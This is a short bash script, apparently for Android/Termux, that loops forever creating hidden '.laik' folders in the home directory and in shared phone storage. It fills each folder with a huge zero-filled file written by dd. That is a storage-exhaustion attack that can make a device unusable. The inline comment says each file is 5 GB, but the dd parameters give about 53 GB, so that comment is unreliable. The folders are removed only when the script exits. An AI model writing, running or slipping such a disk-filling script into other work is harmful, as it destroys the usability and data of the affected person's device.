#!/bin/bash

count=0

trap "cleanup" EXIT

cleanup() {
  echo "The script was terminated successfully, now the created folder will be deleted"
  rm -rf "$HOME/.laik"* "/storage/emulated/0/.laik"*
  exit
}

while true; do
  for i in {1..500}; do
    ((count++))
    folder_name="$HOME/.laik_$count"
    mkdir "$folder_name"
    mkdir "/storage/emulated/0/.laik_$count"
    
    # Buat file dengan ukuran 5 GB
    dd if=/dev/zero of="$folder_name/file_$count" bs=1024 count=52000000 status=none
  done
  
  clear
  echo "Creating folders..."
  echo "Total folders created: $count"
  
  # Animasi loading
  spinner="/-\\|"
  printf "\r${spinner:count++%${#spinner}:1}"

  sleep 1  # Gantilah nilai sleep sesuai kebutuhan
done
